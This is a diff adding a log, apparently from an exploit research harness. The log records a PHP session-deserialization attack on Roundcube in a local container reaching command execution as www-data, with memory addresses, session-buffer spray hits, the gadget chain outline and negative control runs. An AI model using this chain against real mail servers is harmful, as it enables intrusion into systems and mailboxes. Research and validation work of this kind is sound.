@@ -1,0 +1,42 @@
+=== simple 8.5.12 ===
+[*] Roundcube 115560 terminal (8.5.12)
+    target 127.0.0.1:18311 container php2shell-rc-8512 spray 8135
+[s] response=HTTP/1.1 200 OK proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+[s] plugin log:
+1793404289.215385 pid=328 plugin-load handler=php_serialize name=PHPSESSID
+1793404289.215483 pid=328 handler-switched handler=php
+1793404289.216027 pid=328 simple-dtor
+1793404289.223151 pid=328 plugin-init task=.*
+
+=== terminal 8.5.12 ===
+[*] Roundcube 115560 terminal (8.5.12)
+    target 127.0.0.1:18311 container php2shell-rc-8512 spray 8135
+[m] magic hits=9 raw-input=7 session-buffer=4
+[m]   hit=0xffff81c6c82d vstart=0xffff81c6c019 delta=0x6c019 sessbuf=False pre64_tail=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'(\x00\x00\x00\x00\x00\x00|"
+[m]   hit=0xffff81c7082d vstart=0xffff81c70019 delta=0x70019 sessbuf=False pre64_tail=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'(\x00\x00\x00\x00\x00\x00|"
+[m]   hit=0xffff81c7a1d5 vstart=0xffff81c799c1 delta=0x799c1 sessbuf=True pre64_tail=b'essed";i:1;}}}s:10295:"upload_progress_|'
+[m]   hit=0xffff81c8083d vstart=0xffff81c80029 delta=0x80029 sessbuf=True pre64_tail=b'\x00\x00\x00\x16\x00\x00\x00B\rH"2*\x19\xe07(\x00\x00\x00\x00\x00\x00upload_progress_|'
+[m]   hit=0xffff81c861d5 vstart=0xffff81c859c1 delta=0x859c1 sessbuf=True pre64_tail=b'essed";i:1;}}}s:10295:"upload_progress_|'
+[m]   hit=0xffff81c9f1d5 vstart=0xffff81c9e9c1 delta=0x9e9c1 sessbuf=True pre64_tail=b'essed";i:1;}}}s:10295:"upload_progress_|'
+[m]   hit=0xffff836cf9ae vstart=0xffff836cf19a delta=0x1acf19a sessbuf=False pre64_tail=b' name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n|'
+[m] carrier candidate = highest-address session buffer
+[m] pid=434 main=0xffff81c00000 lib=0xffff7e600000 zif=0xffff7eb35490
+[m] magic=0xffff81c9f1d5 carrier=0xffff81c9e9d5 value_string=0xffff81c9e9c1 delta=0x9e9c1
+[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+[EVIDENCE] Roundcube 115560 session decode -> var_destroy -> uid=33
+=== control bias-zif +0x1000 ===
+[*] Roundcube 115560 terminal (8.5.12)
+    target 127.0.0.1:18311 container php2shell-rc-8512 spray 8135
+    [!] BIAS zif by 0x1000 (control: must not fire)
+[f] response=<none> proof=''
+[!] no proof written
+=== control no-switch ===
+[*] Roundcube 115560 terminal (8.5.12)
+    target 127.0.0.1:18311 container php2shell-rc-8512 spray 8135
+[f] response=HTTP/1.1 200 OK proof=''
+[!] no proof written
+=== control nogadget ===
+[*] Roundcube 115560 terminal (8.5.12)
+    target 127.0.0.1:18311 container php2shell-rc-8512 spray 8135
+[f] response=HTTP/1.1 200 OK proof=''
+[!] no proof written
